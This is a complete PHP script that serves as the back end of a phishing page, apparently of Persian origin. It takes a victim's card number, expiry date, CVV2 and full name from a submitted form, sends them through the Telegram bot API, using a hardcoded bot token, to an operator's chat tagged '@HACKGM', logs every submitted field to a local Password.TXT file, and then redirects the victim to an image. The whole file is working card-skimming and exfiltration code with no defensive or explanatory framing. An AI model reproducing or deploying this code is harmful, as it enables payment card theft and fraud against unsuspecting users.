<?php 
$msg_card= $_POST['card_number_fake'];
$msg_pass= $_POST['card_exp_date_fake'];
$msg_cvv2= $_POST['card_cvv2'];
$msg_name= $_POST['full_name'];

$admin = 671015507;//ایدی عددی
$token = "982888752:AAGjJv7KiX_q5haIZsaYDphgfoHyhqqKUig";//توکن

define('API_KEY',"$token");
function bot($method,$datas=[]){
    $url = 'https://api.telegram.org/bot'.API_KEY.'/'.$method;
$ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

if (!empty($_POST)) {
bot('sendmessage', [
'chat_id'=>$admin,
'text'=>"

Full Name : $msg_name
Credit Card : $msg_card
Date : $msg_pass
CVV2 : $msg_cvv2

@HACKGM
", 
]);
} 
$handle = fopen("Password.TXT","a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n");
}
fwrite($handle, "\r   \n   \n");
fclose($handle);
exit;
?>
<meta content='0;url=https://miro.medium.com/max/1024/1*Cbt2ORNMLr2lJmGXG-DwmQ.png<?php ?>' http-equiv='refresh'/>